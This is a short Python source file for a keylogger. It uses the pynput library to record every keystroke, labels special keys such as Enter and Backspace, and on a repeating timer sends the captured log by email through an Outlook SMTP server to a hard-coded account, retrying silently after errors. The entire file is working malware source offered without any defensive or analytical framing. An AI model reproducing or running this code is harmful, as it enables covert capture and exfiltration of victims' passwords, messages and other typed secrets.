from pynput import keyboard
import smtplib
import threading

class Keylogger:
    def __init__(self, email, password, time):
        self.log = ""
        self.email = email
        self.password = password
        self.time = time

        self.email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)
        self.email_server.starttls()
        self.email_server.login(email, password)

        self.keyboard_listener = keyboard.Listener(on_press=self.callback_function)
        self.keyboard_listener.start()

        self.thread_function()

    def callback_function(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.backspace:
                self.log += " [BackSpace] "
            elif key == keyboard.Key.enter:
                self.log += " [ENTER] "
            elif key == keyboard.Key.caps_lock:
                self.log += " [CapsLock] "
            elif key == keyboard.Key.ctrl_l:
                self.log += " [CTRL] "
            elif key == keyboard.Key.shift:
                self.log += " [Shift] "
            elif key == keyboard.Key.tab:
                self.log += " [Tab] "
            else:
                self.log += str(key)

    def send_email(self, email, password, message1):
        email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)
        email_server.starttls()
        email_server.login(email, password)
        message = f"Subject: Keylogger Log:\n\n {message1}"
        email_server.sendmail(email, email, message.encode('utf-8'))
        email_server.quit()
        self.log = ""

    def thread_function(self):
        try:
            self.send_email(self.email, self.password, self.log)
            timer_object = threading.Timer(self.time, self.thread_function)
            timer_object.start()
        except:
            wait_time = 60
            timer = threading.Timer(wait_time, self.thread_function)
            timer.start()

kl = Keylogger(email, password, time)